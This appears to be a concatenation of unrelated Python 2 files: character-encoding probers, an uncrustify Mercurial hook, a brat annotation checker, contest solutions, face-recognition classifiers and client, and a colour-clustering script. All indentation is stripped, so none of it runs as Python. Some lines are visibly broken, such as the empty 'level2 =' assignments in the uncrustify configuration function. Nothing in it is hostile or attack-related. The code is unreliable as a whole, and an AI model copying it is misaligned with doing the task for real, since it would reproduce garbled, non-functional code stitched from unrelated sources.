self._mCharToFreqOrder = EUCKRCharToFreqOrder
self._mTableSize = EUCKR_TABLE_SIZE
self._mTypicalDistributionRatio = EUCKR_TYPICAL_DISTRIBUTION_RATIO
def get_order(self, aBuf):
first_char = wrap_ord(aBuf[0])
if first_char >= 0xB0:
return 94 * (first_char - 0xB0) + wrap_ord(aBuf[1]) - 0xA1
else:
return -1
class GB2312DistributionAnalysis(CharDistributionAnalysis):
def __init__(self):
CharDistributionAnalysis.__init__(self)
self._mCharToFreqOrder = GB2312CharToFreqOrder
self._mTableSize = GB2312_TABLE_SIZE
self._mTypicalDistributionRatio = GB2312_TYPICAL_DISTRIBUTION_RATIO
def get_order(self, aBuf):
first_char, second_char = wrap_ord(aBuf[0]), wrap_ord(aBuf[1])
if (first_char >= 0xB0) and (second_char >= 0xA1):
return 94 * (first_char - 0xB0) + second_char - 0xA1
else:
return -1
class Big5DistributionAnalysis(CharDistributionAnalysis):
def __init__(self):
CharDistributionAnalysis.__init__(self)
self._mCharToFreqOrder = Big5CharToFreqOrder
self._mTableSize = BIG5_TABLE_SIZE
self._mTypicalDistributionRatio = BIG5_TYPICAL_DISTRIBUTION_RATIO
def get_order(self, aBuf):
first_char, second_char = wrap_ord(aBuf[0]), wrap_ord(aBuf[1])
if first_char >= 0xA4:
if second_char >= 0xA1:
return 157 * (first_char - 0xA4) + second_char - 0xA1 + 63
else:
return 157 * (first_char - 0xA4) + second_char - 0x40
else:
return -1
class SJISDistributionAnalysis(CharDistributionAnalysis):
def __init__(self):
CharDistributionAnalysis.__init__(self)
self._mCharToFreqOrder = JISCharToFreqOrder
self._mTableSize = JIS_TABLE_SIZE
self._mTypicalDistributionRatio = JIS_TYPICAL_DISTRIBUTION_RATIO
def get_order(self, aBuf):
first_char, second_char = wrap_ord(aBuf[0]), wrap_ord(aBuf[1])
if (first_char >= 0x81) and (first_char <= 0x9F):
order = 188 * (first_char - 0x81)
elif (first_char >= 0xE0) and (first_char <= 0xEF):
order = 188 * (first_char - 0xE0 + 31)
else:
return -1
order = order + second_char - 0x40
if second_char > 0x7F:
order = -1
return order
class EUCJPDistributionAnalysis(CharDistributionAnalysis):
def __init__(self):
CharDistributionAnalysis.__init__(self)
self._mCharToFreqOrder = JISCharToFreqOrder
self._mTableSize = JIS_TABLE_SIZE
self._mTypicalDistributionRatio = JIS_TYPICAL_DISTRIBUTION_RATIO
def get_order(self, aBuf):
char = wrap_ord(aBuf[0])
if char >= 0xA0:
return 94 * (char - 0xA1) + wrap_ord(aBuf[1]) - 0xa1
else:
return -1
from . import constants
import sys
from .charsetprober import CharSetProber
class CharSetGroupProber(CharSetProber):
def __init__(self):
CharSetProber.__init__(self)
self._mActiveNum = 0
self._mProbers = []
self._mBestGuessProber = None
def reset(self):
CharSetProber.reset(self)
self._mActiveNum = 0
for prober in self._mProbers:
if prober:
prober.reset()
prober.active = True
self._mActiveNum += 1
self._mBestGuessProber = None
def get_charset_name(self):
if not self._mBestGuessProber:
self.get_confidence()
if not self._mBestGuessProber:
return None
return self._mBestGuessProber.get_charset_name()
def feed(self, aBuf):
for prober in self._mProbers:
if not prober:
continue
if not prober.active:
continue
st = prober.feed(aBuf)
if not st:
continue
if st == constants.eFoundIt:
self._mBestGuessProber = prober
return self.get_state()
elif st == constants.eNotMe:
prober.active = False
self._mActiveNum -= 1
if self._mActiveNum <= 0:
self._mState = constants.eNotMe
return self.get_state()
return self.get_state()
def get_confidence(self):
st = self.get_state()
if st == constants.eFoundIt:
return 0.99
elif st == constants.eNotMe:
return 0.01
bestConf = 0.0
self._mBestGuessProber = None
for prober in self._mProbers:
if not prober:
continue
if not prober.active:
if constants._debug:
sys.stderr.write(prober.get_charset_name()
+ ' not active\n')
continue
cf = prober.get_confidence()
if constants._debug:
sys.stderr.write('%s confidence = %s\n' %
(prober.get_charset_name(), cf))
if bestConf < cf:
bestConf = cf
self._mBestGuessProber = prober
if not self._mBestGuessProber:
return 0.0
return bestConf
from . import constants
import re
class CharSetProber:
def __init__(self):
pass
def reset(self):
self._mState = constants.eDetecting
def get_charset_name(self):
return None
def feed(self, aBuf):
pass
def get_state(self):
return self._mState
def get_confidence(self):
return 0.0
def filter_high_bit_only(self, aBuf):
aBuf = re.sub(b'([\x00-\x7F])+', b' ', aBuf)
return aBuf
def filter_without_english_letters(self, aBuf):
aBuf = re.sub(b'([A-Za-z])+', b' ', aBuf)
return aBuf
def filter_with_english_letters(self, aBuf):
return aBuf
import os
import subprocess
import tempfile
import sys
import filecmp
import optparse
import shutil
import difflib
import re
def hg_modified_files():
files = os.popen ('hg st -nma')
return [filename.strip() for filename in files]
def copy_file(filename):
[tmp,pathname] = tempfile.mkstemp()
src = open(filename, 'r')
dst = open(pathname, 'w')
for line in src:
dst.write(line)
dst.close()
src.close()
return pathname
def uncrustify_config_file(level):
level2 =
level1 =
level0 =
[tmp,pathname] = tempfile.mkstemp()
dst = open(pathname, 'w')
dst.write(level0)
if level >= 1:
dst.write(level1)
if level >= 2:
dst.write(level2)
dst.close()
return pathname
class PatchChunkLine:
SRC = 1
DST = 2
BOTH = 3
def __init__(self):
self.__type = 0
self.__line = ''
def set_src(self,line):
self.__type = self.SRC
self.__line = line
def set_dst(self,line):
self.__type = self.DST
self.__line = line
def set_both(self,line):
self.__type = self.BOTH
self.__line = line
def append_to_line(self, s):
self.__line = self.__line + s
def line(self):
return self.__line
def is_src(self):
return self.__type == self.SRC or self.__type == self.BOTH
def is_dst(self):
return self.__type == self.DST or self.__type == self.BOTH
def write(self, f):
if self.__type == self.SRC:
f.write('-%s\n' % self.__line)
elif self.__type == self.DST:
f.write('+%s\n' % self.__line)
elif self.__type == self.BOTH:
f.write(' %s\n' % self.__line)
else:
raise Exception('invalid patch')
class PatchChunk:
def __init__(self, src_pos, dst_pos):
self.__lines = []
self.__src_pos = int(src_pos)
self.__dst_pos = int(dst_pos)
def src_start(self):
return self.__src_pos
def add_line(self,line):
self.__lines.append(line)
def src(self):
src = []
for line in self.__lines:
if line.is_src():
src.append(line)
return src
def dst(self):
dst = []
for line in self.__lines:
if line.is_dst():
dst.append(line)
return dst
def src_len(self):
return len(self.src())
def dst_len(self):
return len(self.dst())
def write(self,f):
f.write('@@ -%d,%d +%d,%d @@\n' % (self.__src_pos, self.src_len(),
self.__dst_pos, self.dst_len()))
for line in self.__lines:
line.write(f)
class Patch:
def __init__(self):
self.__src = ''
self.__dst = ''
self.__chunks = []
def add_chunk(self, chunk):
self.__chunks.append(chunk)
def chunks(self):
return self.__chunks
def set_src(self,src):
self.__src = src
def set_dst(self,dst):
self.__dst = dst
def apply(self,filename):
return
def write(self,f):
f.write('--- %s\n' % self.__src )
f.write('+++ %s\n' % self.__dst )
for chunk in self.__chunks:
chunk.write(f)
def parse_patchset(generator):
src_file = re.compile('^--- (.*)$')
dst_file = re.compile('^\+\+\+ (.*)$')
chunk_start = re.compile('^@@ -([0-9]+),([0-9]+) \+([0-9]+),([0-9]+) @@')
src = re.compile('^-(.*)$')
dst = re.compile('^\+(.*)$')
both = re.compile('^ (.*)$')
patchset = []
current_patch = None
for line in generator:
m = src_file.search(line)
if m is not None:
current_patch = Patch()
patchset.append(current_patch)
current_patch.set_src(m.group(1))
continue
m = dst_file.search(line)
if m is not None:
current_patch.set_dst(m.group(1))
continue
m = chunk_start.search(line)
if m is not None:
current_chunk = PatchChunk(m.group(1), m.group(3))
current_patch.add_chunk(current_chunk)
continue
m = src.search(line)
if m is not None:
l = PatchChunkLine()
l.set_src(m.group(1))
current_chunk.add_line(l)
continue
m = dst.search(line)
if m is not None:
l = PatchChunkLine()
l.set_dst(m.group(1))
current_chunk.add_line(l)
continue
m = both.search(line)
if m is not None:
l = PatchChunkLine()
l.set_both(m.group(1))
current_chunk.add_line(l)
continue
raise Exception()
return patchset
def remove_trailing_whitespace_changes(patch_generator):
whitespace = re.compile('^(.*)([ \t]+)$')
patchset = parse_patchset(patch_generator)
for patch in patchset:
for chunk in patch.chunks():
src = chunk.src()
dst = chunk.dst()
try:
for i in range(0,len(src)):
s = src[i]
d = dst[i]
m = whitespace.search(s.line())
if m is not None and m.group(1) == d.line():
d.append_to_line(m.group(2))
except:
return patchset
return patchset
def indent(source, debug, level):
output = tempfile.mkstemp()[1]
cfg = uncrustify_config_file(level)
if debug:
sys.stderr.write('original file=' + source + '\n')
sys.stderr.write('uncrustify config file=' + cfg + '\n')
sys.stderr.write('temporary file=' + output + '\n')
try:
uncrust = subprocess.Popen(['uncrustify', '-c', cfg, '-f', source, '-o', output],
stdin = subprocess.PIPE,
stdout = subprocess.PIPE,
stderr = subprocess.PIPE)
(out, err) = uncrust.communicate('')
if debug:
sys.stderr.write(out)
sys.stderr.write(err)
except OSError:
raise Exception ('uncrustify not installed')
src = open(source, 'r')
dst = open(output, 'r')
diff = difflib.unified_diff(src.readlines(), dst.readlines(),
fromfile=source, tofile=output)
src.close()
dst.close()
if debug:
initial_diff = tempfile.mkstemp()[1]
sys.stderr.write('initial diff file=' + initial_diff + '\n')
tmp = open(initial_diff, 'w')
tmp.writelines(diff)
tmp.close()
final_diff = tempfile.mkstemp()[1]
if level < 3:
patchset = remove_trailing_whitespace_changes(diff);
dst = open(final_diff, 'w')
if len(patchset) != 0:
patchset[0].write(dst)
dst.close()
else:
dst = open(final_diff, 'w')
dst.writelines(diff)
dst.close()
if debug:
sys.stderr.write('final diff file=' + final_diff + '\n')
shutil.copyfile(source,output)
patch = subprocess.Popen(['patch', '-p1', '-i', final_diff, output],
stdin = subprocess.PIPE,
stdout = subprocess.PIPE,
stderr = subprocess.PIPE)
(out, err) = patch.communicate('')
if debug:
sys.stderr.write(out)
sys.stderr.write(err)
return output
def indent_files(files, diff=False, debug=False, level=0, inplace=False):
output = []
for f in files:
dst = indent(f, debug=debug, level=level)
output.append([f,dst])
if inplace:
for src,dst in output:
shutil.copyfile(dst,src)
return True
failed = []
for src,dst in output:
if filecmp.cmp(src,dst) == 0:
failed.append([src, dst])
if len(failed) > 0:
if not diff:
print 'Found %u badly indented files:' % len(failed)
for src,dst in failed:
print '  ' + src
else:
for src,dst in failed:
s = open(src, 'r').readlines()
d = open(dst, 'r').readlines()
for line in difflib.unified_diff(s, d, fromfile=src, tofile=dst):
sys.stdout.write(line)
return False
return True
def run_as_hg_hook(ui, repo, **kwargs):
from mercurial import lock, error
lock.LockError = error.LockError
files = hg_modified_files()
if not indent_files(files, inplace=False):
return True
return False
def run_as_main():
parser = optparse.OptionParser()
parser.add_option('--debug', action='store_true', dest='debug', default=False,
help='Output some debugging information')
parser.add_option('-l', '--level', type='int', dest='level', default=0,
help="Level of style conformance: higher levels include all lower levels. "
"level=0: re-indent only. level=1: add extra spaces. level=2: insert extra newlines and "
"extra braces around single-line statements. level=3: remove all trailing spaces")
parser.add_option('--check-hg-hook', action='store_true', dest='hg_hook', default=False,
help='Get the list of files to check from mercurial\'s list of modified '
'and added files and assume that the script runs as a pretxncommit mercurial hook')
parser.add_option('--check-hg', action='store_true', dest='hg', default=False,
help="Get the list of files to check from mercurial\'s list of modified and added files")
parser.add_option('-f', '--check-file', action='store', dest='file', default='',
help="Check a single file")
parser.add_option('--diff', action='store_true', dest='diff', default=False,
help="Generate a diff on stdout of the indented files")
parser.add_option('-i', '--in-place', action='store_true', dest='in_place', default=False,
help="Indent the input files in-place")
(options,args) = parser.parse_args()
debug = options.debug
if options.hg_hook:
files = hg_modified_files()
if not indent_files(files, debug=options.debug,
level=options.level,
inplace=False):
sys.exit(1)
elif options.hg:
files = hg_modified_files()
indent_files(files, diff=options.diff,
debug=options.debug,
level=options.level,
inplace=options.in_place)
elif options.file != '':
file = options.file
if not os.path.exists(file) or \
not os.path.isfile(file):
print 'file %s does not exist' % file
sys.exit(1)
indent_files([file], diff=options.diff,
debug=options.debug,
level=options.level,
inplace=options.in_place)
sys.exit(0)
if __name__ == '__main__':
run_as_main()
import sys
import re
import codecs
from collections import namedtuple
from os.path import basename
Textbound = namedtuple('Textbound', 'id type start end text')
TEXTBOUND_RE = re.compile(r'^([A-Z]\d+)\t(\S+) (\d+) (\d+)\t(.*)$')
class FormatError(Exception):
pass
def txt_for_ann(fn):
tfn = re.sub(r'\.ann$', '.txt', fn)
if tfn == fn:
raise FormatError
return tfn
def parse_textbound(s):
m = TEXTBOUND_RE.match(s)
if not m:
raise FormatError
id_, type_, start, end, text = m.groups()
start, end = int(start), int(end)
return Textbound(id_, type_, start, end, text)
def process(fn):
textbounds = []
with codecs.open(fn, 'rU', encoding='utf8', errors='strict') as f:
for l in f:
l = l.rstrip('\n')
if not l or l.isspace():
continue
if l[0] != 'T':
continue
else:
textbounds.append(parse_textbound(l))
with codecs.open(txt_for_ann(fn), 'rU', encoding='utf8',
errors='strict') as f:
text = f.read()
for id_, type_, start, end, ttext in textbounds:
try:
assert text[start:end] == ttext
except:
print 'Mismatch in %s: %s %d %d' % (basename(fn), id_, start, end)
print '     reference: %s' % \
ttext.encode('utf-8').replace('\n', '\\n')
print '     document : %s' % \
text[start:end].encode('utf-8').replace('\n', '\\n')
def main(argv=None):
if argv is None:
argv = sys.argv
if len(argv) < 2:
print >> sys.stderr, 'Usage:', argv[0], 'FILE [FILE [...]]'
return 1
for fn in argv[1:]:
process(fn)
return 0
if __name__ == '__main__':
sys.exit(main(sys.argv))
import math
class Solution(object):
def solve_error(self, cipher):
N, H = cipher
s = 0
m = max(H)
up = math.log(m, 2)
for i, e in enumerate(H):
if i > up and i > 1000:
break
s += float(e) / 2 ** (i + 1)
return int(math.ceil(s))
def solve(self, cipher):
N, H = cipher
mini = 0
for i in xrange(N - 1, -1, -1):
mini = (mini + H[i] + 1) / 2
return mini
if __name__ == "__main__":
import sys
f = open("1.in", "r")
solution = Solution()
N = int(f.readline().strip())
H = map(int, f.readline().strip().split(' '))
cipher = N, H
s = "%s\n" % (solution.solve(cipher))
print s,
import subprocess
def basic_child_process():
proc1 = subprocess.Popen(
['echo', 'Hello from the child!'],
stdout = subprocess.PIPE
)
proc2 = subprocess.Popen(
['sleep', '2'],
stdout=subprocess.PIPE
)
print ".Popen is non-blocking"
out, err = proc1.communicate()
print out
print "Wait for sleep termination"
proc2.communicate()
return out.decode('utf-8')
def poll_status():
proc = subprocess.Popen(['sleep', '0.03'])
cnt = 0
while proc.poll() is None:
cnt += 1
print cnt
return 'Exit status %s' % proc.poll()
class Solution(object):
def solve(self, cipher):
r2, k = cipher
required = 0
r = r2 ** 0.5
for x in xrange(0, int(r) + 1):
low = 0
high = int(r) + 1
while low <= high:
mid = (low + high) / 2
if x * x + mid * mid == r2:
if mid == 0 or x == 0:
required += 2
else:
required += 4
if required > k: return "impossible"
break
elif x * x + mid * mid < r2:
low = mid + 1
else:
high = mid - 1
if required > k: return "impossible"
return "possible"
if __name__ == "__main__":
import sys
f = open("1.in", "r")
testcases = int(f.readline().strip())
for t in xrange(testcases):
cipher = map(int, f.readline().strip().split(' '))
s = "%s\n" % (Solution().solve(cipher))
print s,
def half_sub(a, b):
borrow = ~a & b
out   = a ^ b
return out, borrow
def full_sub(a, b, bin):
out, b1 = half_sub(a, b)
out, b2 = half_sub(out, bin)
bout = b1 | b2
return out, bout
if __name__ == "__main__":
print "a b c out borrow"
for a in (0, 1):
for b in (0, 1):
for bin in (0, 1):
print a, b, bin, full_sub(a, b, bin)
import warnings
import functools
def Override(interface_class):
def overrider(method):
try:
assert (method.__name__ in dir(interface_class))
return method
except AssertionError:
print method.__name__+" for "+interface_class.__name__
return overrider
warnings.simplefilter('always', DeprecationWarning)
def Deprecated(func, msg=None):
message = msg or "Use of deprecated function '{}`.".format(func.__name__)
@functools.wraps(func)
def wrapper_func(*args, **kwargs):
warnings.warn(message, DeprecationWarning, stacklevel=2)
return func(*args, **kwargs)
return wrapper_func
from facerec_py.facerec.distance import EuclideanDistance
from facerec_py.facerec.normalization import gaussian_kernel, inverse_dissim
from facerec_py.facerec.util import asRowMatrix
import logging
import numpy as np
import operator as op
class AbstractClassifier(object):
def compute(self, X, y):
raise NotImplementedError("Every AbstractClassifier must implement the compute method.")
def predict(self, X):
raise NotImplementedError("Every AbstractClassifier must implement the predict method.")
def update(self, X, y):
raise NotImplementedError("This Classifier is cannot be updated.")
def binary_predict(self, q, lbl):
raise NotImplementedError("The binary prediction is not implemented")
class NearestNeighbor(AbstractClassifier):
def __init__(self, dist_metric=EuclideanDistance(), k=1):
AbstractClassifier.__init__(self)
self.k = k
self.dist_metric = dist_metric
self.X = []
self.y = np.array([], dtype=np.int32)
def update(self, X, y):
self.X.append(X)
self.y = np.append(self.y, y)
def compute(self, X, y):
self.X = X
self.y = np.asarray(y)
def predict(self, q):
distances = []
for xi in self.X:
xi = xi.reshape(-1, 1)
d = self.dist_metric(xi, q)
distances.append(d)
if len(distances) > len(self.y):
raise Exception("More distances than classes. Is your distance metric correct?")
distances = np.asarray(distances)
idx = np.argsort(distances)
sorted_y = self.y[idx]
sorted_distances = distances[idx]
sorted_sim = inverse_dissim(sorted_distances)
hist = dict((key, val) for key, val in enumerate(np.bincount(sorted_y[:self.k])) if val)
predicted_label = max(hist.iteritems(), key=op.itemgetter(1))[0]
return [predicted_label, {'labels': sorted_y, 'distances': sorted_distances, 'similarities': sorted_sim}]
def __repr__(self):
return "NearestNeighbor (k=%s, dist_metric=%s)" % (self.k, repr(self.dist_metric))
try:
from svmutil import *
except ImportError:
logger = logging.getLogger("facerec.classifier.SVM")
logger.debug("Import Error: libsvm bindings not available.")
except:
logger = logging.getLogger("facerec.classifier.SVM")
logger.debug("Import Error: libsvm bindings not available.")
import sys
from StringIO import StringIO
from svmutil import *
bkp_stdout = sys.stdout
class SVM(AbstractClassifier):
def __init__(self, param=None):
AbstractClassifier.__init__(self)
self.logger = logging.getLogger("facerec.classifier.SVM")
self.param = param
self.svm = svm_model()
self.param = param
if self.param is None:
self.param = svm_parameter("-q")
def compute(self, X, y):
self.logger.debug("SVM TRAINING (C=%.2f,gamma=%.2f,p=%.2f,nu=%.2f,coef=%.2f,degree=%.2f)" % (
self.param.C, self.param.gamma, self.param.p, self.param.nu, self.param.coef0, self.param.degree))
X = asRowMatrix(X)
y = np.asarray(y)
problem = svm_problem(y, X.tolist())
self.svm = svm_train(problem, self.param)
self.y = y
def predict(self, X):
X = np.asarray(X).reshape(1, -1)
sys.stdout = StringIO()
p_lbl, p_acc, p_val = svm_predict([0], X.tolist(), self.svm)
sys.stdout = bkp_stdout
predicted_label = int(p_lbl[0])
return [predicted_label, {'p_lbl': p_lbl, 'p_acc': p_acc, 'p_val': p_val}]
def __repr__(self):
return "Support Vector Machine (kernel_type=%s, C=%.2f,gamma=%.2f,p=%.2f,nu=%.2f,coef=%.2f,degree=%.2f)" % (
self.param.kernel_type, self.param.C, self.param.gamma, self.param.p, self.param.nu,
self.param.coef0, self.param.degree)
import abc
from weakref import WeakKeyDictionary
class Shape(object):
__metaclass__ = abc.ABCMeta
@abc.abstractmethod
def method_to_implement(self, i):
return
class Resistor(object):
def __init__(self, ohms):
self.ohms = ohms
self.voltage = 0
self.current = 0
class VoltageResistance(Resistor):
def __init__(self, ohms):
super(VoltageResistance, self).__init__(ohms)
self._voltage = 0
@property
def voltage(self):
return self._voltage
@voltage.setter
def voltage(self, voltage):
self._voltage = voltage
self.current = self._voltage / self.ohms
class GradeDescriptor(object):
def __init__(self):
self._values = WeakKeyDictionary()
def __get__(self, instance, instance_type):
if instance is None: return self
return self._values.get(instance, 0)
def __set__(self, instance, value):
if not (0 <= value <= 100):
raise ValueError("Grade must be between 0 and 100")
self._values[instance] = value
import json
import base64
import urllib2
SERVER_ADDRESS = "http://localhost:5000"
class FaceRecClient(object):
def __init__(self, url):
self.url = url
def getBase64(self, filename):
with open(filename, "rb") as image_file:
encoded_string = base64.b64encode(image_file.read())
return encoded_string
def request(self, api_func, request_data):
url_func = "%s/api/%s" % (self.url, api_func)
req = urllib2.Request(url=url_func, data = json.dumps(request_data), headers = {'content-type': 'application/json'})
res = urllib2.urlopen(req)
return res.read()
def recognize(self, filename):
base64Image = self.getBase64(filename)
json_data = { "image" : base64Image }
api_result = self.request("recognize", json_data)
print json.loads(api_result)
if __name__ == '__main__':
from argparse import ArgumentParser
parser = ArgumentParser()
parser.add_argument("-s", "--server", action="store", dest="host", default=SERVER_ADDRESS,
help="Sets the endpoint for the server to call.", required=False)
parser.add_argument('image', nargs='+', help="Images to call the server with.")
print "=== Usage ==="
parser.print_help()
args = parser.parse_args()
print "=== Predictions ==="
faceRecClient = FaceRecClient(args.host)
for image in args.image:
faceRecClient.recognize(image)
class Solution(object):
def solve(self, cipher):
N, M = cipher
low = 0
high = N
while low + 1 < high:
mid = (low + high) / 2
r = self.Turan(N, mid)
if r < M:
low = mid
else:
high = mid
return high
def Turan(self, n, r):
return 0.5 * (n ** 2 - (n % r) * (n / r + 1) ** 2 - (r - (n % r)) * (n / r) ** 2)
if __name__ == "__main__":
import sys
f = open("1.in", "r")
testcases = int(f.readline().strip())
for t in xrange(testcases):
cipher = map(int, f.readline().strip().split(' '))
s = "%s\n" % (Solution().solve(cipher))
print s,
class Solution(object):
def solve(self, cipher):
a, b, x = cipher
if a > 1:
result = int((a ** b) / float(x) + 0.5) * x
else:
result = 1
if result != int(result):
if result > 0.5 and x == 1:
return 1
else:
return 0
return result
if __name__ == "__main__":
import sys
f = open("1.in", "r")
testcases = int(f.readline().strip())
for t in xrange(testcases):
cipher = map(int, f.readline().strip().split(' '))
s = "%s\n" % (Solution().solve(cipher))
print s,
class Solution(object):
def solve(self, cipher):
N, A = cipher
A.sort()
diff = 1 << 31
lst = []
for i in xrange(N - 1):
b = A[i + 1]
a = A[i]
if abs(a - b) < diff:
diff = abs(a - b)
lst = [a, b]
elif abs(a - b) == diff:
lst.append(a)
lst.append(b)
return " ".join(map(str, lst))
if __name__ == "__main__":
import sys
f = open("1.in", "r")
solution = Solution()
N = int(f.readline().strip())
A = map(int, f.readline().strip().split(' '))
cipher = N, A
s = "%s\n" % (solution.solve(cipher))
print s,
import json
import codecs
class Codec(object):
def decode(self, jsn):
return json.dumps(jsn, ensure_ascii=False, encoding='utf-8')
def write(self, jsn, filename):
with codecs.open(filename, "w", encoding="utf-8") as file:
file.write(jsn)
from .constants import eStart
from .compat import wrap_ord
class CodingStateMachine:
def __init__(self, sm):
self._mModel = sm
self._mCurrentBytePos = 0
self._mCurrentCharLen = 0
self.reset()
def reset(self):
self._mCurrentState = eStart
def next_state(self, c):
byteCls = self._mModel['classTable'][wrap_ord(c)]
if self._mCurrentState == eStart:
self._mCurrentBytePos = 0
self._mCurrentCharLen = self._mModel['charLenTable'][byteCls]
curr_state = (self._mCurrentState * self._mModel['classFactor']
+ byteCls)
self._mCurrentState = self._mModel['stateTable'][curr_state]
self._mCurrentBytePos += 1
return self._mCurrentState
def get_current_charlen(self):
return self._mCurrentCharLen
def get_coding_state_machine(self):
return self._mModel['name']
import sys
class Solution(object):
def __init__(self):
self.dirs = [(0, 1, 'L'), (0, -1, 'R'), (-1, 0, 'D'), (1, 0, 'U')]
def solve(self, cipher):
M, N, K, mat = cipher
i_dest = -1
j_dest = -1
for i in xrange(M):
for j in xrange(N):
if mat[i][j] == "*":
i_dest = i
j_dest = j
break
f = [[[sys.maxint for _ in xrange(N)] for _ in xrange(M)] for _ in xrange(K + 1)]
for k in xrange(K + 1):
f[k][0][0] = 0
for k in xrange(1, K + 1):
for i in xrange(0, M):
for j in xrange(0, N):
for dir in self.dirs:
i_pre = i + dir[0]
j_pre = j + dir[1]
if 0 <= i_pre < M and 0 <= j_pre < N:
if mat[i_pre][j_pre] == dir[2]:
f[k][i][j] = min(f[k][i][j], f[k - 1][i_pre][j_pre])
else:
f[k][i][j] = min(f[k][i][j], f[k - 1][i_pre][j_pre] + 1)
mini = sys.maxint
for k in xrange(K + 1):
mini = min(mini, f[k][i_dest][j_dest])
return mini if mini != sys.maxint else -1
if __name__ == "__main__":
f = open("0.in", "r")
solution = Solution()
M, N, K = map(int, f.readline().strip().split(' '))
mat = []
for i in xrange(M):
mat.append(list(f.readline().strip()))
cipher = M, N, K, mat
s = "%s\n" % (solution.solve(cipher))
print s,
class Solution_TLE(object):
def __init__(self):
self.coinage = [10, 5, 2, 1]
def solve(self, cipher):
target, lst = cipher
lst.reverse()
result = [0]
self.dfs(lst, target, result)
return result[0]
def dfs(self, seq, remaining, result):
if remaining < 0:
return
if remaining == 0:
result[0] += 1
return
bound = 0
for i in xrange(4):
bound += seq[i] * self.coinage[i]
if bound < remaining:
return
for j in xrange(4):
for i in xrange(seq[j]):
remaining -= (i + 1) * self.coinage[j]
self.dfs([0] * (j + 1) + seq[j + 1:], remaining, result)
remaining += (i + 1) * self.coinage[j]
class Solution(object):
def __init__(self):
self.coinage = [1, 2, 5, 10]
self.count = {}
self.A = None
def solve(self, cipher):
target, self.A = cipher
return self.get_count(target, 3)
def get_count(self, n, k):
if (n, k) not in self.count:
if k == 0:
if n % self.coinage[k] == 0 and self.coinage[k] * self.A[k] >= n:
self.count[(n, k)] = 1
else:
self.count[(n, k)] = 0
else:
i = 0
cnt = 0
while i <= self.A[k] and i * self.coinage[k] <= n:
cnt += self.get_count(n - i * self.coinage[k], k - 1)
i += 1
self.count[(n, k)] = cnt
return self.count[(n, k)]
if __name__ == "__main__":
import sys
f = open("1.in", "r")
testcases = int(f.readline().strip())
for t in xrange(testcases):
target = int(f.readline().strip())
lst = map(int, f.readline().strip().split(' '))
cipher = target, lst
s = "%s\n" % (Solution().solve(cipher))
print s,
class Solution:
def firstWillWin_MLE(self, values):
n = len(values)
if n <= 2:
return True
F = [[0 for _ in xrange(n)] for _ in xrange(2)]
s = [0 for _ in xrange(n)]
s[n-1] = values[n-1]
for i in xrange(n-2, -1, -1):
s[i] = values[i] + s[i+1]
F[0][n-1] = F[1][n-1] = s[n-1]
F[0][n-2] = F[1][n-2] = s[n-2]
for i in xrange(n-3, -1, -1):
for p in xrange(2):
F[p][i] = max(
values[i]+s[i+1]-F[1^p][i+1],
values[i]+values[i+1]+s[i+2]-F[1^p][i+2]
)
if F[0][0]>F[1][1] or F[0][0]>F[1][2]:
return True
return False
def firstWillWin(self, values):
n = len(values)
if n <= 2:
return True
F = [[0 for _ in xrange(4)] for _ in xrange(2)]
s = values[n-1]
F[0][(n-1)%4] = F[1][(n-1)%4] = s
s += values[n-2]
F[0][(n-2)%4] = F[1][(n-2)%4] = s
for i in xrange(n-3, -1, -1):
for p in xrange(2):
t = i%4
F[p][t] = max(
values[i]+s-F[1^p][(t+1)%4],
values[i]+s-F[1^p][(t+2)%4]
)
if i == 0:
break
s += values[i]
t = 0
if F[0][t] > F[1][(t+1)%4] or F[0][t] > F[1][(t+2)%4]:
return True
return False
if __name__ == "__main__":
values = [16,27,25,23,25,16,12,9,1,2,7,20,19,23,16,0,6,22,16,11,8,27,9,2,20,2,13,7,25,29,12,12,18,29,27,13,16,1,22,
9,3,21,29,14,7,8,14,5,0,23,16,1,20]
assert Solution().firstWillWin(values)==True
class Solution:
def firstWillWin_MLE(self, values):
n = len(values)
if n == 1:
return True
F = [[[0 for _ in xrange(n)] for _ in xrange(n)] for _ in xrange(2)]
s = [0 for _ in xrange(n+1)]
for i in xrange(1, n+1):
s[i] = s[i-1]+values[i-1]
for i in xrange(n):
for p in xrange(2):
F[p][i][i] = values[i]
for i in xrange(n-2, -1, -1):
for j in xrange(i+1, n):
for p in xrange(2):
F[p][i][j] = max(
values[i]+s[j+1]-s[i+1]-F[1^p][i+1][j],
values[j]+s[j]-s[i]-F[1^p][i][j-1]
)
return F[0][0][n-1]>min(F[1][0][n-2], F[1][1][n-1])
def firstWillWinNormalCase(self, values):
n = len(values)
if n == 1:
return True
SZ = 4
F = [[[0 for _ in xrange(SZ)] for _ in xrange(SZ)] for _ in xrange(2)]
s = [0 for _ in xrange(n+1)]
for i in xrange(1, n+1):
s[i] = s[i-1]+values[i-1]
for i in xrange(n-2, -1, -1):
for j in xrange(i+1, n):
for p in xrange(2):
if j == i+1:
a = values[i+1]
b = values[i]
else:
a = F[1^p][(i+1)%SZ][j%SZ]
b = F[1^p][i%SZ][(j-1)%SZ]
F[p][i%SZ][j%SZ] = max(
values[i]+s[j+1]-s[i+1]-a,
values[j]+s[j]-s[i]-b
)
return F[0][0][(n-1)%SZ] > min(F[1][0][(n-2)%SZ], F[1][1][(n-1)%SZ])
def firstWillWin(self, values):
n = len(values)
if n%2 == 0 and self.firstWillWinEven(values):
return True
return self.firstWillWinNormalCase(values)
def firstWillWinEven(self, values):
odd_s = 0
even_s = 0
for i in xrange(len(values)):
if i%2 == 0:
even_s += values[i]
else:
odd_s += values[i]
return odd_s != even_s
if __name__ == "__main__":
assert Solution().firstWillWin([3, 2, 2]) is True
assert Solution().firstWillWin([1, 20, 4]) is False
assert Solution().firstWillWin([1, 2, 3, 4, 5, 6, 7, 8, 13, 11, 10, 9]) is True
class Solution:
def firstWillWin(self, n):
return not n%3 == 0
from sklearn.cluster import KMeans
import matplotlib.pyplot as plt
import numpy as np
import argparse
import cv2
def centroid_histogram(clt):
numLabels = np.arange(0, len(np.unique(clt.labels_)) + 1)
(hist, _) = np.histogram(clt.labels_, bins = numLabels)
hist = hist.astype("float")
hist /= hist.sum()
return hist
def plot_colors(hist, centroids):
bar = np.zeros((50, 300, 3), dtype = "uint8")
startX = 0
for (percent, color) in zip(hist, centroids):
endX = startX + (percent * 300)
cv2.rectangle(bar, (int(startX), 0), (int(endX), 50),
color.astype("uint8").tolist(), -1)
startX = endX
return bar
ap = argparse.ArgumentParser()
ap.add_argument("-i", "--image", required=True, help="Path to the image")
ap.add_argument("-c", "--clusters", required=True, type=int,
help="# of clusters")
args = vars(ap.parse_args())
image = cv2.imread(args["image"])
